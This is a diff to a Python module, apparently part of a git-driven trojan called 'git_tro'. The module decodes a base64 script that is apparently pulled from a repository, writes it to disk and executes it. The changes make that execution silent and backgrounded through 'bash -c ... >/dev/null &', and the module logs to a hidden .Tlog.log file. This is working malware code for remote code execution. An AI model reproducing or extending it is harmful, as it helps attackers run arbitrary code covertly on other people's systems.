@@ -32,11 +32,12 @@ def get_file_contents(filepath):
 
 
 def run(**args): # Must import its personal lib, git_tro will execute this module in # environment
+	print("[*] In RunScriptFromGit module.")
 	os.system("echo '[*] In RunScriptFromGit module.'>> .Tlog.log") #Todelete
 	script	= get_file_contents(scriptPath)
 	#content = None
 	if script is not None:
-		content	= base64.b64decode(script).decode()
+		content	= base64.b64decode(script).decode("utf-8")
 		#print(content)
 		#try:
 		#	os.makedirs("scripts", mode=777)
@@ -46,7 +47,9 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
 		fich.write(content)
 		fich.close()
 
-		os.system(ScriptExec+" "+TargetScript) #os.execv("scripts/test.py") #Permission denied
+		cmd = "bash -c "+ScriptExec+" "+TargetScript+ ">/dev/null &"
+		print(cmd)
+		os.system(cmd) #os.execv("scripts/test.py") #Permission denied
 		return str("getRunScript: script {} successfully started".format(scriptPath))
 	else:
 		#os.system("echo ' Unable to find file'>> .Tlog.log")
